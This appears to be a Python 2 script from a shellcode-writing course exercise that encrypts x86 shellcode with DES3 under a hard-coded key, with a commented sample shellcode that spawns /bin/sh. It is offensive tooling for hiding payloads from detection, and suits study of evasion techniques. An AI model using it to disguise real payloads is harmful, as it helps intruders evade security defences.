#!/usr/bin/python 
# 
# Linux x86
# Author:  thryb
# Date:    09-11-2016
# Purpose: DES3 shellcode crypter
# ID:      SLAE-770
# Git:     https://www.github.com/thryb/SLAE-770
#
import sys
from Crypto.Cipher import DES3

if len(sys.argv) == 2:
        shellcode = str(sys.argv[1])
else:
        print "Usage: %s <shellcode>" % str(sys.argv[0])
        exit(2)

#shellcode = "\\x31\\xc9\\xf7\\xe1\\xb0\\x0b\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xcd\\x80\\x90\\x90\\x90"

rawshellcode = shellcode.replace('\\x', '').decode('hex')

key = b'Thisisa16bkey...'

cipher = DES3.new(key, DES3.MODE_ECB)

msg = cipher.encrypt(rawshellcode)

encryptedshellcode = msg.encode('hex')

j = iter(encryptedshellcode)

encryptedshellcode = '\\x'.join(a+b for a,b in zip(j, j))
encryptedshellcode = '\\x' + encryptedshellcode

print "Encrypted shellcode: " + encryptedshellcode
